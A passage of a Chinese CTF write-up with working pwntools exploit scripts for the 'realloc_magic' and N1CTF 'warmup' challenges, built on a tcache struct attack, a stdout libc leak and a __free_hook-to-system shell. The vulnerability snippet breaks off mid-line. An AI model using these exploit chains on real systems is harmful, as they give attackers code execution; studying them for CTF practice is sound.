        r       = lambda numb=4096          :ctx.recv(numb)
        ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
        irt     = lambda                    :ctx.interactive()
        rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
        dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
        # misc functions
        uu32    = lambda data   :u32(data.ljust(4, '\0'))
        uu64    = lambda data   :u64(data.ljust(8, '\0'))
        ctx.binary = './realloc_magic'
        ctx.custom_lib_dir = '/home/leo/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/'#remote libc
        ctx.remote_libc = '/home/leo/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
        ctx.debug_remote_libc = True
        libc = ELF('/home/leo/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
        rs()
        ctx.breakpoints = [0xbcd]
        ctx.symbols = {'lst':0x202058,}
        logg=0
        if logg:
            context.log_level = 'debug'
        def rea(sz, c='\n'):
            sla('>> ',1)
            sla('?', sz)
            if sz:
                sa('?', c)
        def free():
            sla('>> ',2)
        #double free  
        rea(0x68)
        free()
        rea(0x18)
        rea(0)
        rea(0x48)
        free()
        rea(0)
        heap  = 0x7010
        stdout= 0x2760
        dbg()
        ipy()
        rea(0x68, 'a' * 0x18 + p64(0x201) + p16(heap))#size + fd
        rea(0)
        rea(0x48)
        rea(0)
        rea(0x48, '\xff' * 0x40)
        rea(0x58, 'a' * 0x18 + '\x00' * 0x20 + p64(0x1f1) + p16(heap + 0x40))#change tcache fake chunk
        rea(0)
        rea(0x18, p64(0) + p64(0))#chunk overlap
        rea(0)
        #stdout
        rea(0x1e8,p64(0) * 4 + p16(stdout))#tcache attack
        rea(0)
        rea(0x58, p64(0xfbad1800) + p64(0) * 3 +p8(0xc8))
        lb = uu64(ru('\x7f',drop=False)[-6:])-libc.symbols['_IO_2_1_stdin_']
        success('libc_addr: ' + hex(lb))
        sla('>> ',666)#ptr=0
        rea(0x1e8, 'a' * 0x18 + p64(lb + libc.sym['__free_hook'] - 8))
        rea(0,)
        rea(0x48, '/bin/sh\x00' + p64(lb + libc.sym['system']))
        free()
        irt()
### N1CTF warmup
##### 漏洞点
    printf("index:");
      v1 = sub_B4E();
      if ( v1 >= 0 && v1 counts写成0xff使得chunk不会释放进tcache。  
##### Step2
    delete(3)#get unsortedbin
        add('\x01'*0x40)#recover tcache_count
        delete(0)
        edit(2,p16(stdout))#stdout attack
由于程序限制了malloc出来的chunk大小为0x40，而利用tcache struct attack可以获得tache
struct结构体指针，从而将这块chunk free掉就可以绕过限制，在tcahce struct上踩出main_arena地址。  
将大小为0x50对应的tcache_entry踩出main_arena地址，才能在malloc(0x40)时部分覆盖低2字节攻击stdout。
##### Step3
    add('0')
        add(p64(0xfbad1800)+p64(0)*3+'\xc8')
        lb = uu64(r(6))-0x3eba00#stdin
        success('libc_base = {}'.format(hex(lb)))
        fh = lb + libc.sym['__free_hook']
        sys = lb + libc.sym['system']
        delete(2)
        edit(0,p64(fh))
        add('/bin/sh\x00')
        add(p64(sys))
        delete(2)
        irt()
攻击stdout泄露libc后，改写tcache struct中的tcache_entry为free_hook，实现任意地址写。  
因为需要爆破heap和stdout两次，所以成功概率为1/256。
##### exp
    from PwnContext import *
    try:
        from IPython import embed as ipy
    except ImportError:
        print ('IPython not installed.')
    if __name__ == '__main__':        
        # context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
        #context.log_level = 'debug'
        s       = lambda data               :ctx.send(str(data)) 
        sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
        sl      = lambda data               :ctx.sendline(str(data)) 
        sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
        r       = lambda numb=4096          :ctx.recv(numb)
        ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
        irt     = lambda                    :ctx.interactive()
        rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
        dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
        uu32    = lambda data   :u32(data.ljust(4, '\0'))
        uu64    = lambda data   :u64(data.ljust(8, '\0'))
        ctx.binary = './warmup'
        #ctx.custom_lib_dir = '/home/leo/Downloads/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/'
        #ctx.debug_remote_libc = True # True for debugging remote libc, false for local.
        ctx.symbols={'ptr':0x202060,'lst':0x202080}
        ctx.breakpoints=[0xf34]
        rs()
        libc = ctx.libc # ELF object of the corresponding libc.
        def add(c):#10 0x40
            sla('>>',1)
            sa('content>>',c)
        def delete(idx):#double free
            sla('>>',2)
            sla('index:',idx)
        def edit(idx,c):#set ptr
            sla('>>',3)
            sla('index:',idx)
            sa('content>>',c)
        add('0')
        add('2')
        delete(0)
        delete(0)
        tcache = 0x6010#tcache_entry
        stdout = 0x6760
        dbg()
        ipy()
        add(p16(tcache))#tcache attack
        add('0')
        add('\xff'*0x40)#tcache_count 0x6010
        delete(3)#get unsortedbin
        add('\x01'*0x40)#recover tcache_count
        delete(0)
        edit(2,p16(stdout))#stdout attack
        add('0')
        add(p64(0xfbad1800)+p64(0)*3+'\xc8')
        lb = uu64(r(6))-0x3eba00#stdin
        success('libc_base = {}'.format(hex(lb)))
        fh = lb + libc.sym['__free_hook']
        sys = lb + libc.sym['system']
        delete(2)
        edit(0,p64(fh))
        add('/bin/sh\x00')
        add(p64(sys))
        delete(2)
        irt()
# 总结
tcache struct attack方法比较适用于没有输出函数，不知道bss地址、libc地址和heap地址等偏移地址，利用chunk
overlap或UAF等堆漏洞，可以部分篡改tcache的fd，通过tcache attack技术分配到tcache
struct，篡改tcache->counts数组和tcache->entry指针数组，达到main_arena上的任意地址写。  
虽然需要的利用条件减少了，但这种方法的缺点是需要爆破，远程攻击所需要的时间长。